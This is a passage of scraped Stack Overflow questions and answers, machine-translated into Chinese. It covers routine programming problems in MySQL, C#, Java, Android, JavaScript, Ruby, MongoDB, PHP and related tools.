在这个[站点](http://www.jquery4u.com/plugins/30-text-captions-overlay-image-plugins/#.UD8bkJZRC48)中，您将看到 30 个 jquery 插件，它们允许您在图像上放置文本。

或使用 CSS：[http ://css-tricks.com/text-blocks-over-image/](http://css-tricks.com/text-blocks-over-image/)

# mysql - 在不指定列名的情况下更新 MySQL

> ID：12192278
> 
> 赞同：1
> 
> 时间：2012-08-30T07:51:19.820
> 
> 标签：mysql

我想更新一个 mysql 行，但我不想指定所有列名。该表有 9 行，我总是想以正确的顺序更新最后 7 行。这些是字段

```
id
projectid
fangate
home
thanks
overview
winner
modules.wallPost
modules.overviewParticipant 
```

有什么方法可以在不指定名称的情况下更新最后几条记录？使用 INSERT 语句可以很容易地做到这一点：

```
INSERT INTO `settings`
VALUES (NULL, ...field values...) 
```

所以我希望我能做这样的事情：

```
UPDATE `settings`
VALUES (NULL, ...field values...)
WHERE ...statement... 
```

但不幸的是，这不起作用。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-30T08:04:39.467

如果前两列构成主键（或唯一索引），您可以使用[替换](http://dev.mysql.com/doc/refman/5.5/en/replace.html)

所以基本上不是写

```
UPDATE settings
   SET fangate = $fangate,
       home = $home,
       thanks = $thanks
       overview = $overview,
       winner = $winner,
       modules.wallPost = $modules.wallPost,
       modules.overviewParticipant = $modules.overviewParticipant
WHERE id = $id AND procjectId = $projectId 
```

你会写

```
REPLACE INTO settings
 VALUES ($id, 
         $projectId,
         $fangate,
         $home,
         $thanks
         $overview,
         $winner,
         $modules.wallPost,
         $modules.overviewParticipant) 
```

当然，这仅在该行已经存在时才有效，否则它将被创建。此外，如果这很重要，它将在幕后导致 DELETE 和 INSERT。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-30T07:55:17.643

你不能。您始终必须指定列名，因为 UPDATE 不会编辑整行，它会编辑**指定**的列。这是 UPDATE 语法的链接：http: [//dev.mysql.com/doc/refman/5.0/en/update.html](http://dev.mysql.com/doc/refman/5.0/en/update.html)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-30T07:55:30.813

**不**，它适用于 ，`INSERT`因为即使您没有指定列名但您在`VALUE`子句中提供了所有值。现在，在 中`UPDATE`，您需要指定与值关联的列名。

`UPDATE`语法需要将被修改的列名。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-08-30T08:01:10.987

您是否总是更新相同的表和列？

在这种情况下，一种方法是在您的架构中定义一个存储过程。这样你就可以这样做：

```
CALL update_settings(id, projectid, values_of_last_7 ..); 
```

虽然您必须创建该过程，但请查看 Mysql 网页以了解如何执行此操作，例如： [http ://docs.oracle.com/cd/E17952_01/refman-5.0-en/create-procedure.html](http://docs.oracle.com/cd/E17952_01/refman-5.0-en/create-procedure.html)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-08-30T07:56:43.590

恐怕你不能不指定列名。

您可以在此处参考[更新文档](http://dev.mysql.com/doc/refman/5.5/en/update.html)。

# c# - C# Slider On Release 方法

> ID：12192282
> 
> 赞同：-1
> 
> 时间：2012-08-30T07:51:33.090
> 
> 标签：c#, kinect

我正在尝试使用 C# 的滑块进行一些基本的 kinect 角度控制。我现在的问题是我需要一个处理程序方法，它只会在我放开滑块按钮后才会做出反应。我尝试了使用 ManipulationEnded 但它似乎对我没有任何作用。

C# 中是否有这样的方法可以用于此目的？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T03:28:54.473

你在使用 WPF 吗？我刚刚对此做了一个快速测试，看来你想试试这个`LostMouseCapture`活动。

在 .xaml

```
<Slider ... LostMouseCapture="slider1_LostMouseCapture" /> 
```

在 .cs 文件中：

```
private void slider1_LostMouseCapture(object sender, MouseEventArgs e)
{
    Console.WriteLine("New value: {0}", slider1.Value);
} 
```

请注意，如果用户使用键盘调整滑块（箭头键），这不会被捕获。如果您对此感到满意，则可以将 Slider 设置为不可聚焦。

# java - 段落从右向左书写

> ID：12192286
> 
> 赞同：2
> 
> 时间：2012-08-30T07:51:37.707
> 
> 标签：java, pdf, itext

有没有办法告诉 iText 段落内容从右到左书写？

我知道可以用ColumnText或表格来完成，但我需要在一个段落中（可以写多个页面）。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-30T08:21:34.693

这里只是一个例子。

```
Document document = new Document(PageSize.A1.rotate(), 20, 20, 20, 20);
document.addTitle("YourReport");
PdfWriter writer = PdfWriter.getInstance(document,
        new FileOutputStream("c:\\ITextTest.pdf"));
document.open();            
Paragraph TitleHeading = new Paragraph(targetFileName);
TitleHeading.setAlignment(writer.RUN_DIRECTION_RTL);            
document.add(TitleHeading); 
```

# sql - 如何在 sql 存储过程中获取包含总计的列表？

> ID：12192291
> 
> 赞同：0
> 
> 时间：2012-08-30T07:51:48.817
> 
> 标签：sql, sql-server, stored-procedures

我想在一个列表中得到这样的结果。

```
TYPE    | subtype | Total
  A     | z       | 5
  A     | y       | 3
total A | NULL    | 8
  B     | i       | 6
total B | Null    | 6 
```

如何在 sql 存储过程中执行此操作？

编辑：我在 T-Sql for Sql server 中工作

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-30T07:54:18.197

这适用于所有类型的 SQL。

```
Select type, subtype, total from source
union all
Select type, 'Total', sum(total) from source group by type
order by type 
```

如果您有特定类型的 SQL，可能会有更有效的解决方案

# java - 如何在使用时选择多个选项在支柱？

> ID：12192292
> 
> 赞同：2
> 
> 时间：2012-08-30T07:51:52.393
> 
> 标签：java, struts, struts-html

我今天学到的一件事是“在

`<html:option>`

就像普通的旧选项一样”，我们可以赋予价值

`<html:select>`

与每个选项的值匹配，如果找到匹配则标记选择的选项。

但我想在页面加载时预先选择多个选项（正在使用

```
<html:select multiple="true"> 
```

如何实现？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-30T08:03:52.203

执行以下操作：

1.  如果可能，使用 JavaScript 为您在该选择列表中创建的多个条目设置所选条目
2.  通过在任何操作之前调用 javascript 函数或使用该操作首先使用 Java 脚本来选择它：

 `````
function callSelectAll(selectName)  
{   
    var i;  
    for(i=0;i<...) {  
        document.getElementById(selectName).options[i].selected = true;
    } 
```` 

`}`

并使用`String[]`数组名称作为该`html:select`属性表单 bean 属性的属性名称。并将该数组的名称作为`html:select`jsp 页面中的属性。

您最终将在表单 bean 的字符串数组中选择所有选定的值。`

# jcr - Modeshape 查询 mixinTypes

> ID：12192294
> 
> 赞同：0
> 
> 时间：2012-08-30T07:51:53.947
> 
> 标签：jcr, modeshape, jcr-sql2

我正在使用 Modeshape 和 modeshape-connector-jdbc-metadata。我想获取代表存储中表的所有节点。该节点具有`[mj:catalog]`混合类型。

我正在使用下一个代码查询存储：

```
 public List getDatabases() throws RepositoryException {
        // Obtain the query manager for the session ...
        QueryManager queryManager = dbSession.getWorkspace().getQueryManager();

        // Create a query object ...
        Query query = queryManager.createQuery("SELECT * FROM [mj:table]"
                , Query.JCR_SQL2);
        // Execute the query and get the results ...
        QueryResult result = query.execute();

        // Iterate over the nodes in the results ...
        NodeIterator nodeIter = result.getNodes();

        List stringResult = new ArrayList();
        while (nodeIter.hasNext()) {
            stringResult.add(nodeIter.nextNode().getName());
        }

        return stringResult;
    }
```

但它总是返回空列表。

我还尝试使用下一个查询进行查询：

```
SELECT unst.*, tbl.* FROM [nt:unstructured] AS unst 
    JOIN [mj:table] AS tbl ON ISSAMENODE(unst,tbl)
```

```
SELECT * FROM [nt:unstructured] WHERE [jcr:mixinTypes] = [mj:table]
```

但结果还是一样。我做错了什么？

感谢您的任何帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-30T11:33:42.687

存在一个已知问题，即数据库元数据节点未自动编制索引。一个简单的解决方法是将 JCR 会话的`getWorkspace()`实例`org.modeshape.jcr.api.Workspace`强制转换为（ModeShape 工作区的公共 API）并调用该`reindex(String path)`方法并传入数据库目录节点（或如果需要，则为祖先）的路径。

# android - (Android) 从音频输入而不是手机麦克风获取音频信号

> ID：12192295
> 
> 赞同：2
> 
> 时间：2012-08-30T07:51:53.470
> 
> 标签：android, audio, microphone, recording

我正在开发一个 Android 程序，其目的是记录声音信号然后对其进行分析。为了记录这个声音信号，我正在使用一个特殊的麦克风，我想通过音频输入直接插入我的 Android 设备，所以我不会使用手机麦克风。

这是我在 Android 网站上找到的内容：

" 定义音频源。这些常量与 setAudioSource(int) 一起使用。摘要常量 int CAMCORDER 麦克风音频源，如果可用，则与摄像头方向相同，否则主设备麦克风 int DEFAULT 默认音频源 int MIC 麦克风音频源 int VOICE_CALL 语音通话uplink + downlink 音频源 int VOICE_COMMUNICATION 为语音通信（例如 VoIP）调整的麦克风音频源。 (Tx) 音频源 "

似乎没有办法将线路定义为音频源。我试图将自己的麦克风插入手机然后录制声音，希望它能够识别我自己的麦克风（作为免提套件），但它一直在手机麦克风上录音。

有谁知道将什么设置为音频源以便我可以使用线路输入？

提前谢谢了 ！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-05-06T17:55:51.060

你做了一些可能不正确的假设。普通的安卓手机没有 Line Ins。它们不是为专业音频系统而设计的。

当您插入耳机时，android 会自动识别您的外部 MIC，您无需在代码中进行设置。只需将其留在`DEFAULT`.

问题是，您的 MIC 需要一个特殊且兼容的连接器。您可能会注意到手机的耳机连接器与立体声插孔不同。因此您需要一个适配器或焊接您自己的兼容插孔。如果您将 MIC 连接到两个部分，android 将假定它是耳机而不是 MIC ！

以下是文章[的链接](https://android.stackexchange.com/questions/19368/how-do-i-use-an-external-microphone-with-my-galaxy-nexus)：如何在 Galaxy Nexus 上使用外接麦克风？ ![在此处输入图像描述](../Images/2bbb4742b6e6194e8571025895429ad3.png)

# android - 在模拟器上添加虚拟设备

> ID：12192301
> 
> 赞同：-1
> 
> 时间：2012-08-30T07:53:05.803
> 
> 标签：android, virtual, emulation

我想在模拟器上添加虚拟设备。所以我在平台源代码上构建了 SDK。我正在谷歌搜索中搜索金鱼但我不知道如何接近它。

请帮助我任何人，任何事情。

谢谢，兆瓦

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-30T07:59:51.573

在 Eclipse 中使用 AVD - 窗口、AVD 管理器。在这里，您可以查看现有设备并创建新设备。

![Eclipse 中的 AVD](../Images/729d380a7d599b6f76eb1753eebf8234.png)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-30T08:00:45.353

Goldfish 是虚拟 Google CPU 的名称，它执行指令 ARM926T。当您创建一个新的虚拟设备时，这对您来说是完全透明的，因为它只是 Google 赋予该设备生命的内部形式。

问候，

# actionscript-3 - flash中的中文字体

> ID：12192303
> 
> 赞同：0
> 
> 时间：2012-08-30T07:53:12.980
> 
> 标签：actionscript-3, fonts

我有一个带有一些 swf 文件的网站。我必须用中文翻译所有网站，当我打开我的 Flash 项目副本到一个文本字段（带有字体 trebuchet）时，中文文本。我已经编译并查看了许多计算机：Windows7 Windows Xp 和 Mac。我很惊讶，因为我正确地看到了汉字，但我只复制了我不包含任何字符或字体的文本。这可能吗？对我来说现在很简单，但我不希望在电脑上看到字符，因为我必须包含中文字体。但现在正在工作，我看对了。为什么这个？正确不包括中文字体？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-30T08:16:49.477

看起来大多数现代系统都会支持：

[http://en.wikipedia.org/wiki/List_of_CJK_fonts](http://en.wikipedia.org/wiki/List_of_CJK_fonts)

通过嵌入字体，您会丢失文件大小，但可以对字体平滑和旋转字体的能力进行一些额外控制，但假设您的目标主要是已经升级到或超越 XP Service Pack 3。

# w3c-validation - php的W3c验证器

> ID：12192315
> 
> 赞同：0
> 
> 时间：2012-08-30T07:54:08.520
> 
> 标签：w3c-validation

我正在应用我的 php 文件进行 w3 验证。在做同样的事情时，我收到一个错误“对不起！无法检查此文档。” 这背后有什么具体原因吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-31T15:49:00.540

[http://validator.w3.org/](http://validator.w3.org/)仅适用于 (X)HTML（和其他一些标记语言），而不适用于 PHP（一种编程语言）。

> 检查 Web 文档的标记（HTML、XHTML 等）

您必须运行 PHP 文件（在您的服务器上）以获取 HTML 输出并将其粘贴到验证器中。

# html - 打开websocket连接时是否可以发送数据

> ID：12192321
> 
> 赞同：30
> 
> 时间：2012-08-30T07:54:39.643
> 
> 标签：html, websocket, jetty-8

我正在实现一个 Jetty Websocket servlet。当服务器接收到新连接时，我想发送一条消息，该消息将由 websocket 的 onopen 函数读取。我希望仅在打开期间发送此消息，而不是使用常规 connection.SendMessage() 函数。有可能这样做吗？如何？

* * *

## 回答 #1

> 赞同：61
> 
> 时间：2015-02-14T13:58:27.077

不要忘记查询字符串。它在 WebSocket url 中有效。

```
new Websocket('ws://yoursite.com/path?a=1&b=2&c=3') 
```

然后您可以轻松地在服务器端解析此 url 以检索数据。

* * *

## 回答 #2

> 赞同：19
> 
> 时间：2012-08-30T08:17:49.820

协议中不支持这一点，但你可以自己捏造一些东西。

*   当您的服务器完成握手时，存储您要传递给客户端的初始消息。
*   在您的客户端`onopen`函数中，发送“读取初始消息”请求。
*   在您的服务器中，检查该客户端是否未读取其初始消息；回复消息；设置一个标志，表示初始消息已发送。
*   您的客户端和服务器现在都可以自由发送其他消息。

# javascript - Javascript Sort() 数组按数字顺序排列

> ID：12192322
> 
> 赞同：3
> 
> 时间：2012-08-30T07:54:48.523
> 
> 标签：javascript, arrays, sorting

我有这样的数组

```
var Arr = [ 'h78em', 'w145px', 'w13px' ] 
```

我想按数字顺序对这个数组进行排序

```
[ 'w13px', 'h78em', 'w145px' ] 
```

对于常规数字排序，我使用此功能

```
var sortArr = Arr.sort(function(a,b){
     return a-b;
}); 
```

但是由于数组中的单词字符，这个函数不起作用

是否可以对这个数组进行排序？如何拆分/匹配数组？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-08-30T07:56:36.303

您可以使用正则表达式在排序时删除所有字母：

```
var Arr = [ 'h78em', 'w145px', 'w13px' ]​;
var sortArr = Arr.sort(function(a, b) {
    a = a.replace(/[a-z]/g, "");  // or use .replace(/\D/g, "");
    b = b.replace(/[a-z]/g, "");  // to leave the digits only
    return a - b;
}); 
```

**演示：http:** [//jsfiddle.net/8RNKE/](http://jsfiddle.net/8RNKE/)

# asp.net - 从网站发送电子邮件时 ASP.NET web.config SMTP 安全异常

> ID：12192324
> 
> 赞同：0
> 
> 时间：2012-08-30T07:54:52.857
> 
> 标签：asp.net, web-config, smtpclient

我在我们的 ISP 托管我的 ASP.NET 站点。每当我想从我的站点发送电子邮件时，都会收到以下错误：

> System.Security.SecurityException：请求 System.Configuration.ConfigurationPermission、System.Configuration、Version=2.0.0.0、Culture=neutral、PublicKeyToken=b03f5f7f11d50a3a' 类型的权限失败。

我还收到以下错误，这是我试图解决的原始错误：

> 尝试访问配置部分 system.net/mailSettings/smtp' 时请求 ConfigurationPermission 失败。要允许所有调用者访问此部分的数据，请在声明此部分的配置文件中将部分属性“requirePermission”设置为“false”。

我试图添加一个配置部分并设置`requirePermission="false"`，但它不起作用。也许类型是错误的？在本地一切正常。从我那里获得读取我的 SMTP 详细信息的许可的任何帮助`web.config`都会很棒。

```
<configSections>
  <sectionGroup name="mailSettings">
    <section name="smtp" type="System.Net.Configuration.SmtpSection" requirePermission="false"/>
  </sectionGroup>           
</configSections>
<system.net>
  <mailSettings>
    <smtp from="...">
      <network  host="..." defaultCredentials="false" userName="..." password="..." />
    </smtp>
  </mailSettings>
</system.net> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-08-12T18:16:14.173

要查看 system.net 配置部分的工作示例，请在您的机器上为您的目标版本打开 machine.config。在 ASP .net 4.0 中，这就是它在我的 machine.config 中的样子

# javascript - 重叠对象上的 HTML 画布事件？

> ID：12192327
> 
> 赞同：2
> 
> 时间：2012-08-30T07:55:11.003
> 
> 标签：javascript, html, canvas

如果我有一个带有一个圆圈的画布，在单击它时会改变颜色，我可以在画布元素上使用一个单击事件并处理它的数学运算（距离公式计算 <= 半径）。但是，如果我有两个重叠的圆圈（如范图），并且我在两个圆圈的中间单击并假设只有顶部的圆圈应该改变颜色怎么办？如果在这种情况下应用第一个圆圈的数学，两个圆圈都会改变颜色。

我将如何处理画布中的事件，如上面的示例中的重叠对象？希望有一个快速/高效的算法？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-30T08:56:51.280

Canvas 并不像 Flash 或 DOM 树，其中事物具有排序顺序或 z-indexes。它有点像一个平面光栅图像，你必须依赖 javascript 中的其他逻辑来记住你绘制的东西的顺序和堆叠顺序。

如果您需要这种交互性，我一直发现最好使用 3rd 方库（除非它真的只是一个或两个没有多大作用的圈子的情况）。

对于基于交互式“形状”的 javascript 图形，我建议使用 Raphael.js 或 D3，它们实际上是 SVG 工具而不是画布工具，所以也许它不适合你，但它们很简单且跨浏览器。

还有 processing.js（Processing the Java lib 的 js 端口），感觉有点像 flash，又可以跟踪所有的关卡和对象。还有很多其他的，但那是另一个话题。

如果它非常简单，选项可能是：

1.  将合成在画布上的所有形状/元素的坐标保存在对象或数组内，该对象或数组还跟踪它们的 z-index/排序顺序，从而让您知道最上面的内容。
2.  使用单击鼠标坐标处的图像数据来确定已单击的内容
3.  使用多个相互合成的画布并让 DOM 为点击事件完成工作

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-30T08:59:20.167

你可能想要一个像 EaselJS 这样的框架，它有一个更好的 api 来完成你想要做的事情。准系统画布 2d-context 在显示对象/精灵行为方面没有提供太多。

上面的回复还提到了某种表示层的列表。我认为实施不会很困难，只是与半径一起检查的另一个条件。

# ant - Ant，从远程机器获取方向名称

> ID：12192339
> 
> 赞同：0
> 
> 时间：2012-08-30T07:55:44.700
> 
> 标签：ant, directory, remote-access

> **可能重复：**
> [Ant，从远程机器下载文件集](https://stackoverflow.com/questions/12191713/ant-download-fileset-from-remote-machine)

如何使用ant从远程机器的指定目录中获取文件夹名称？

# ruby - 如何通过拆分字符的最后一次出现将字符串拆分为仅两部分？

> ID：12192343
> 
> 赞同：53
> 
> 时间：2012-08-30T07:56:09.797
> 
> 标签：ruby

例如：

```
"Angry Birds 2.4.1".split(" ", 2)
 => ["Angry", "Birds 2.4.1"] 
```

如何将字符串拆分为：`["Angry Birds", "2.4.1"]`

* * *

## 回答 #1

> 赞同：114
> 
> 时间：2013-11-29T08:50:19.580

[字符串#rpartition](http://ruby-doc.org/core-2.0.0/String.html#method-i-rpartition)，例如

```
irb(main):068:0> str = "Angry Birds 2.4.1"
=> "Angry Birds 2.4.1"
irb(main):069:0> str.rpartition(' ')
=> ["Angry Birds", " ", "2.4.1"] 
```

由于返回值是一个数组，因此使用*.first*和*.last*可以将结果视为一分为二，例如

 *```
irb(main):073:0> str.rpartition(' ').first
=> "Angry Birds"
irb(main):074:0> str.rpartition(' ').last
=> "2.4.1" 
```

* * *

## 回答 #2

> 赞同：11
> 
> 时间：2012-08-30T08:20:57.657

我有一个这样的解决方案：

```
class String
  def split_by_last(char=" ")
    pos = self.rindex(char)
    pos != nil ? [self[0...pos], self[pos+1..-1]] : [self]
  end
end

"Angry Birds 2.4.1".split_by_last  #=> ["Angry Birds", "2.4.1"]
"test".split_by_last               #=> ["test"] 
```

* * *

## 回答 #3

> 赞同：10
> 
> 时间：2012-08-30T08:15:07.923

像这样的东西可能吗？拆分，其中一个空格后跟除空格之外的任何内容，直到字符串的末尾。

```
"Angry Birds 2.4.1".split(/ (?=\S+$)/)
#=> ["Angry Birds", "2.4.1"] 
```

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2015-04-27T17:36:58.120

I don't seem able to get the example code in my comment properly formatted, so I'm submitting it as a separate answer, even though [Vadym Tyemirov](https://stackoverflow.com/users/1318367/vadym-tyemirov) deserves all the credit for the `String#rpartition` solution he provided above.

I just wanted to add that `String#rpartition` plays very nicely with Ruby's *"don't care" variable*, as typically you're indeed only interested in the first and last element of the result array, but not the middle element *(the separator)*:

```
[1] pry(main)> name, _, version = "Angry Birds 2.4.1".rpartition(' ')
=> ["Angry Birds", " ", "2.4.1"]
[2] pry(main)> name
=> "Angry Birds"
[3] pry(main)> version
=> "2.4.1" 
```

So no need for `Array#first` or `Array#last`... less is more! :-)

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2012-08-30T08:04:01.167

`"Angry Birds 2.4.1".split(/ (?=\d+)/)`

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2014-04-21T18:32:07.513

rpartition 解决方案是一个非常性感的单线（我投了赞成票），但是如果您想要一个更灵活地解决更复杂的分区问题的单线，这里有另一种技术：

```
["Angry Birds 2.4.1".split(' ')[0..-2].join(' '), "Angry Birds 2.4.1".split(' ')[-1..-1].join(' ')] 
```

By more flexible, I mean if there were more items being partitioned, you could just adjust the range of the sequence.

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2012-08-30T09:54:37.243

这可能太棘手了（并且可能不是特别有效），但是您可以这样做：

```
"Angry Birds 2.4.1".reverse.split(" ", 2).map(&:reverse).reverse 
```

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2020-09-18T16:38:17.807

## Create a `String#split_on_last` method.

***Heavily** inspired by [halfelf's answer](https://stackoverflow.com/a/12192707/293280) but permits more than just a single character, doesn't have a default param value and refactored for clarity.*

### Definition

```
class String
  def split_on_last( text )
    position_of_last_occurrence = self.rindex( text )

    return self if position_of_last_occurrence.nil?

    first_part = self[ 0...position_of_last_occurrence ]
    last_part  = self[ position_of_last_occurrence + text.length..-1 ]

    [ first_part, last_part ]
  end
end 
```

### Usage

```
"Angry Birds 2.4.1".split_on_last( " " )
#=> ["Angry Birds", "2.4.1"]

"start middle end end suffix".split_on_last( "end" )
=> ["start middle end ", " suffix"] 
```

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2020-10-10T06:05:39.440

reverse, split, then reverse every element and elements in array

```
"Angry Birds 2.4.1".reverse.split(' ', 2).map(&:reverse).reverse 
```

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2012-08-30T08:26:40.623

```
class String
  def divide_into_two_from_end(separator = ' ')
    self.split(separator)[-1].split().unshift(self.split(separator)[0..-2].join(separator))
  end
end

"Angry Birds 2.4.1".divide_into_two_from_end(' ') #=> ["Angry Birds", "2.4.1"] 
```*

# mongodb - 我该如何做这个 mongodb 查询？搜索集合的孩子

> ID：12192345
> 
> 赞同：3
> 
> 时间：2012-08-30T07:56:23.997
> 
> 标签：mongodb

我对 MongoDB（和 mongoDB 查询）很陌生，所以我有一个问题是如何编写执行以下操作的查询......

使用像我在下面说明的那样的模式......我将如何返回仅由特定用户发布的所有评论的集合？例如，我需要这个来为他们自己的个人资料页面生成用户评论列表。然而，我的意图是将评论作为帖子的子项而不是用户的子项。我假设我不需要保留多余的评论记录，并且这个查询以某种方式是可能的（可能很简单，但我是新手）。

```
{ title: "someTitle",
  author: "someAuthor",
  created: Date,
  comments: [{authorId: objectId, content: "commentContent"},{authorId: objectId, content: "commentContent"}],
  postContent: "This is the content of the post"
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-30T09:14:41.490

对于这种情况，最好将评论分开收集：

```
comments
{
  authorid,
  postId,
  content
} 
```

然后您可以轻松查询用户评论：

```
db.comments.find({authorid: 5}); 
```

您的架构不适用于您的业务，或者会给您带来某种痛苦。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-30T09:38:41.467

这个模式这个模式不是最好的解决方案，我会单独收集评论或存储评论两次。但是使用 Mongo DB 2.2，您可以使用以下聚合查询来做到这一点：

```
db.articles.aggregate(
    {$unwind : '$comments'}, 
    {$match : {'comments.authodId' : 'authodId'}},
    {$project : {comments : 1}}); 
```

另请检查[文档](http://docs.mongodb.org/manual/reference/aggregation/)。

# process - 通过 c 程序和 fork() 查询有关正在运行的后台/前台进程

> ID：12192347
> 
> 赞同：0
> 
> 时间：2012-08-30T07:56:27.660
> 
> 标签：process, fork

好的，我的任务是编写一个 C 程序，该程序将根据 & 是否是最后一个参数，在后台或前台运行特定进程。在谷歌搜索中，我发现要在后台运行一个进程，你所要做的就是跳过父进程中的“wait(&status)!=pid”行。子进程将在后台运行。

这让我想到了一个关于 fork() 的问题。当我键入 fork() 时，会创建一个子进程。现在，我的问题是 - 在调用 fork() 之后，程序的控制是否总是在父进程之前传递给子进程？是否可以先将控件传递给父进程？还是这两个进程并行运行？

如果进程并行运行，我可以看到跳过等待部分可能如何工作，但如果进程按顺序运行则不行。

例如：-

```
pid=fork()
if(pid==0) execvp("ls",argv);
else if(pid>0) return pid; 
```

如果假设，子进程首先运行。"pid==0" 计算结果为真，调用 execvp，覆盖子进程的 ls。"ls" 终止，控制权转移到父进程。这里没有等待命令并且 ls 终止，然后我们才回到父进程。后台工作不会发生。

如果父进程首先运行，它会看到 pid>0，控制转移到主函数。由于没有等待命令，因此子进程根本不会运行，至少在父进程终止之前不会运行。

那么，它实际上是如何工作的呢？我的一些概念可能离题了。如果是，请纠正我。

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-30T08:07:28.620

调度程序平等对待父进程和子进程。如果需要，您不得假设任何预定义的执行顺序和程序同步。

# android - 如何在键盘上方显示我的滚动布局？

> ID：12192348
> 
> 赞同：9
> 
> 时间：2012-08-30T07:56:31.217
> 
> 标签：android, android-layout, scrollview, android-softkeyboard

我在相对布局中使用滚动视图。

在没有键盘的情况下，我可以在所有手机中滚动到页面末尾，在某些手机中，当键盘打开时，我可以完全查看滚动布局。即）- 键盘上方的滚动视图的结尾。

我分析的问题是因为键盘类型在不同的 android 设备中有所不同。

在活动清单中添加 windowSoftInputMode 得到了一些答案。

还补充说：`android:windowSoftInputMode="stateHidden|adjustResize"`

但仍然遇到同样的问题。如果您有解决方案或遇到问题，请分享您的想法。谢谢你的时间。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-15T19:06:57.500

我遇到了这个问题，正在研究类似的问题。`android:windowSoftInputMode="adjustResize"`有时有效，有时无效。为什么不？

这个答案谈到了一个 Android 全屏主题。[Honeycomb (3.1) adjustResize 不再工作？](https://stackoverflow.com/questions/6599341/honeycomb-3-1-adjustresize-no-longer-working)

对我来说，问题是这里的电话：`getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN, WindowManager.LayoutParams.FLAG_FULLSCREEN);`

将标志设置为全屏会在键盘出现时阻止正确滚动。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-30T08:22:27.610

在 onCreate 试试这个代码：

```
getWindow().setSoftInputMode(
            WindowManager.LayoutParams.SOFT_INPUT_ADJUST_RESIZE); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-30T19:33:21.583

这些其他答案应该可以解决您的问题，因此，虽然我对建议以下解决方案犹豫不决，但我将把它扔在那里以防万一您时间紧迫/不做一个非常关键的项目：使用 OnGlobalLayoutListener。

真的没有办法绝对知道是否已经提升了 softKeyboard（可悲），但是您可以做的是调整布局以在滚动视图下方提供键盘空间（即将高度重置为当前高度 - 键盘的高度） .

这里有[一个答案](https://stackoverflow.com/questions/2150078/how-to-check-visibility-of-software-keyboard-in-android)将解释如何很好地做到这一点。同样，我不完全清楚你的问题是什么，因为我们没有看到代码等，这很难诊断为什么其他答案不能解决问题......但如果你真的被卡住了 - 给它试一试:)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-30T08:25:40.933

您可以对 AdroidManifest.xml 中的任何活动进行配置，就像这样...

```
 <activity android:name=".views.ViewportActivity"
                  **android:windowSoftInputMode="adjustPan|adjustResize"**
                  android:label="@string/app_name"
                  android:configChanges="locale"
                  android:screenOrientation="portrait"
                  android:theme="@android:style/Theme.NoTitleBar">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
            </intent-filter>
        </activity> 
```

# php - PHP 从 HTML 表中获取数据以更新 MySQL 数据库

> ID：12192350
> 
> 赞同：1
> 
> 时间：2012-08-30T07:56:39.207
> 
> 标签：php, mysql, html-table

我有一个小问题，我需要从这个 HTML 表中读取数据，问题是我不知道我将拥有多少表行，因为我从 MySQL 选择中将数据放入其中，所以我真正想要的是在选择之后, 在 HTML 表格中添加一些数据来具体说明：

```
<td><input type="text" size="5px"></td> 
```

并单击按钮以从所有新表行输入中读取数据。

```
<table style="display:inline">
<tr>
<td></td>
<th>Home team</th>
<td></td>
<td></td>
<td></td>
<th>Away team</th>
</tr>

<?php
$i=0;
while ($i < $num) {
$Tim1=mysql_result($result,$i,"HomeTeamID");    
$Tim1Name=mysql_result($result,$i,"HomeTeam");
$Tim2=mysql_result($result,$i,"AwayTeamID");
$Tim2Name=mysql_result($result,$i,"AwayTeam");      
$rez=mysql_result($result,$i,"MatchID");        

?>
<tr>
<td class="ID" id="<?php echo $rez;?>"><input value="<?php echo $rez;?>" 
 name="<?php echo $rez;?>" type="hidden" style="display: none">
</td>
<td><label style="padding-right:10px" ><?php echo($Tim1Name); ?></label></td>

<td><input type="text" size="5px"></td>

<td><label>:</label></td>

<td><input type="text" size="5px"></td>

<td><label style="padding-left:10px"><?php echo($Tim2Name); ?></label></td>
</tr>

        <?php
        $i++;
    }   
    ?>
 <tr align="right" style="padding-top:5px">
 <td></td>
 <td></td>
 <td></td>
 <td></td>
 <td></td>
 <td><input type="submit" value="Insert" name="Insert"></td>
 </tr>
 </table> 
```

如果你不明白我的问题，问你想要什么，我会回答。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-30T08:11:31.660

尝试使用以下

首先在你的 head 部分添加一个 jquery 库

然后构建一个这样的函数

```
$(document).ready(function(){

$('.insert').click(function({

$('.testValues').each(function(){
var Values=$(this).attr('title');

$(this).val(Values);
$(this).attr('title','');
});
}); 
```

});

并将您的 HTML 更改为影响上述代码，如下所示

```
<table style="display:inline">
<tr>
<td></td>
<th>Home team</th>
<td></td>
